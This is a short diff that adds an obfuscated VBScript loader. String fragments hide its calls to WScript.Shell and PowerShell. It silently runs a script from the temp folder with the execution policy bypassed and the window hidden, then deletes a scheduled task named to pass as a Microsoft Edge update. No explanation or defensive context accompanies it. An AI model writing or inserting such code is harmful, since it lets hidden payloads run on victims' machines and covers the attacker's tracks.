@@ -1,0 +1,5 @@
+Set eeeepffkasoa = CreateObject("WS"&"crip"&"t.Sh"&"ell")
+ddddplllsoapdf = eeeepffkasoa.ExpandEnvironmentStrings("%te"&"m"&"p%") + "\Te"&"mp.p"&"s1"
+eeeepffkasoa.Run "pow"&"ersh"&"ell.ex"&"e -Execu"&"tionPo"&"licy By"&"pass -File """ & ddddplllsoapdf & """", 0, False
+taskName = "Mic"&"ros"&"oftEd"&"g"&"eUpda"&"teTa"&"skMac"&"hin"&"eon"&"e_g"&"it"
+eeeepffkasoa.Run "sch"&"tasks /De"&"let"&"e /TN """ & taskName & """ /F", 0, True
